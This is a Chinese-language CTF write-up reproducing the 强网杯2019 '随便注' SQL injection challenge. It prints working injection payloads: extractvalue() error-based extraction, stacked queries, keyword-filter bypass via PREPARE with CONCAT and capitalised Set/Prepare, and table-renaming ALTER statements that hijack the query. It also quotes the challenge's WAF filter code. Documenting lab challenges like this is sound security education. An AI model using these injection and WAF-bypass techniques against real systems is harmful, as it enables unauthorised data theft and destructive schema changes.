---
title: 强网杯2019 随便注 SQL注入复现
description: 强网杯2019随便注题目完整复现，涵盖报错注入、WAF绕过、堆叠查询、预编译绕过、表重命名等MySQL/MariaDB注入实战技巧
category: uncategorized
tags:
- CTF
- SQL注入
- 强网杯2019
- MariaDB
- 堆叠查询
- WAF绕过
- 预编译
- 表重命名
date: '2020-07-01'
updated: '2026-11-12'
---

## 题目概况

- **比赛**：强网杯2019
- **题目**：随便注
- **平台**：BUUCTF Web板块
- **数据库**：MariaDB 10.3.18（MySQL分支，注入语法兼容MySQL 5+）
- **核心漏洞**：SQL注入 + 堆叠查询
- **关键函数**：PHP `multi_query()` 导致多语句执行

## 初步探测与注入点确认

### 正常访问行为
- 访问首页显示正常内容
- 提交参数 `id=1` 返回正常数据
- 提交单引号 `id=1'` 触发数据库报错
- 提交双引号 `id=1''` 恢复正常

**结论**：存在字符型SQL注入，后端未对单引号进行有效过滤。

### 数据库指纹识别
报错信息明确显示 **MariaDB**，作为MySQL分支，其注入语法与MySQL 5+ 完全兼容。

## 报错注入实战

### floor() 报错受阻
```sql
-- 尝试经典floor报错
-- 结果：被WAF拦截，提示过滤了 select 关键字
```

### xpath 报错成功绕过
利用 `updatexml()` / `extractvalue()` 函数报错回显：

```sql
-- 获取版本信息
1' and extractvalue(1, concat(0x7e, (select @@version), 0x7e))-- 

-- 获取当前数据库
1' and extractvalue(1, concat(0x7e, (select database()), 0x7e))-- 

-- 获取当前用户
1' and extractvalue(1, concat(0x7e, (select user()), 0x7e))-- 
```

**获取关键信息**：
- 版本：MariaDB 10.3.18
- 数据库：`qwb_2019_supersqli`
- 用户：`root@localhost`

## WAF绕过尝试与失败分析

### 正则硬匹配拦截
- `select` 关键字被直接字符串匹配拦截
- 在 `select` 前后添加字符/注释/换行均无效
- 判断为 **正则硬匹配** 而非语义分析

### 传输层绕过尝试
- 改POST + 分块传输：不支持POST方法
- 改POST + 编码绕过：同上

### 正则回溯/超长字符串
- 尝试构造超长字符串触发正则回溯绕过
- **失败原因**：OpenResty环境有最大长度限制

**结论**：常规WAF绕过路径不通，需寻找SQL层面替代方案。

## 堆叠查询攻击链

### 支持堆叠查询的数据库环境
| 数据库 | 支持情况 |
|--------|----------|
| SQL Server | ✅ 支持 |
| MySQL 5.0+ | ✅ 支持 |
| PostgreSQL | ✅ 支持 |
| Oracle | ❌ 不支持 |

MariaDB 10.3.18 基于MySQL 5.7+，**支持堆叠查询**。

### 利用入口
```sql
1'; show tables;-- 
```
成功执行，返回两张表：
- `1919810931114514` （纯数字表名）
- `words`

### 表结构探测
```sql
-- 纯数字表名必须用反引号包裹
1'; show columns from `1919810931114514`;-- 
1'; desc words;-- 
```

**发现**：flag 字段位于表 `1919810931114514` 中。

## 核心绕过技术：预编译 + 大小写绕过

### 预编译语句绕过 select 过滤
```sql
set @sql = CONCAT('se','lect * from `1919810931114514`;');
prepare flag from @sql;
EXECUTE flag;
```
**原理**：通过 `CONCAT()` 拼接关键字，避开静态字符串匹配。

### strstr() 二次过滤拦截
报错提示：`prepare` 和 `set` 被 `strstr()` 检测拦截。

### 大小写绕过 strstr()
```sql
Set @sql = CONCAT('se','lect * from `1919810931114514`;');
Prepare flag from @sql;
EXECUTE flag;
```
**关键点**：MySQL 关键字不区分大小写，但 PHP `strstr()` 区分大小写，修改首字母大写即可绕过。

**成功获取 Flag**。

## 替代解法：表重命名劫持查询

### 攻击思路
1. 当前查询默认针对 `words` 表
2. 无法使用 `select` 查询其他表
3. **将目标表重命名为当前表名**，劫持原本的查询逻辑

### 执行序列
```sql
1';
alter table words rename to words1;
alter table `1919810931114514` rename to words;
alter table words change flag id varchar(50);
-- 
```

**步骤解析**：
1. `words` → `words1`（备份原表）
2. `1919810931114514` → `words`（目标表顶替）
3. `flag` 字段 → `id` 字段（匹配原查询 SELECT 列）

### 触发查询
```sql
1' or '1'='1
```
原本查询 `words` 表的 `id` 字段，现实际查询到 flag 内容。

## 源码审计确证

### 关键代码片段
```php
// index.php
$mysqli->multi_query($sql);  // 允许多语句执行，根因
```

### 双层 WAF 函数
```php
function waf1($str) {
    return preg_match('/select|update|delete|insert|union|into|load_file|outfile/i', $str);
}

function waf2($str) {
    return strstr($str, 'prepare') || strstr($str, 'set');
}
```
- `waf1`：正则匹配高危关键字（不区分大小写）
- `waf2`：`strstr()` 精确匹配 `prepare` / `set`（**区分大小写**）

## 知识点总结速查表

| 技术点 | 关键语法/原理 | 适用场景 |
|--------|---------------|----------|
| **纯数字表名操作** | `` `1919810931114514` `` | MySQL/MariaDB 标识符转义 |
| **查看表结构** | `show columns from tbl` / `desc tbl` | 信息收集阶段 |
| **预编译绕过关键字过滤** | `SET @sql=CONCAT('se','lect...'); PREPARE p FROM @sql; EXECUTE p;` | 关键字被字符串匹配拦截 |
| **strstr() 大小写绕过** | `Prepare` / `Set` 替代 `prepare` / `set` | PHP层区分大小写的字符串检测 |
| **multi_query() 堆叠注入** | `; stmt1; stmt2;--` | PHP mysqli 多语句执行未禁用 |
| **表重命名劫持** | `RENAME TABLE a TO b, c TO a;` + 字段重命名 | 无法直接 SELECT 目标表时 |

## 实战启示

1. **报错注入首选 xpath 系列** 当 `floor()` 被过滤时
2. **堆叠查询是绕过 SELECT 过滤的核心手段** 需确认 DBMS 版本与驱动支持
3. **预编译 + 字符串拼接** 是绕过关键字匹配的通用模式
4. **大小写敏感性差异**（SQL vs PHP）常被忽视，是高价值绕过点
5. **DDL 操作（RENAME/ALTER）可作为数据窃取的替代路径** 当 DML 被严格限制时
6. **审计 `multi_query` / `mysqli_next_result` 等多语句执行接口** 是代码审计重点

## 相关资源

- 题目源码：[qwb_2019_supersqli/index.php](https://github.com/glzjin/qwb_2019_supersqli/blob/master/files/html/index.php)
- BUUCTF 题目练习平台

## 来源

- [007攻防实验室-202007-202010_4](../sources/007攻防实验室-202007-202010_4.md)
